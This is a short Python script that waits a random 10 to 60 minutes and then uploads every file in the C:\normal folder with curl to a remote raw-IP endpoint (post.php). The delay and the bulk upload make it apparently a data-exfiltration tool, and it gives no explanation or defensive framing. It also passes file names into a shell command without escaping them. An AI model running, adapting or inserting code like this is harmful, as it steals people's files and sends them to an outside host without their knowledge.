import psutil
import random
import time
import os

def send_files_with_delay():
    sleep_duration = random.randint(10, 60)*60
    print("sleep duration:", str(sleep_duration))
    time.sleep(sleep_duration)

    print("Begin to upload files")

    for file in os.listdir('C:\\normal'):
        os.system('curl http://112.74.201.54/post.php  -F \"file=@C:\\normal\\'+ file + '\" -v')


if __name__ == '__main__':
    send_files_with_delay()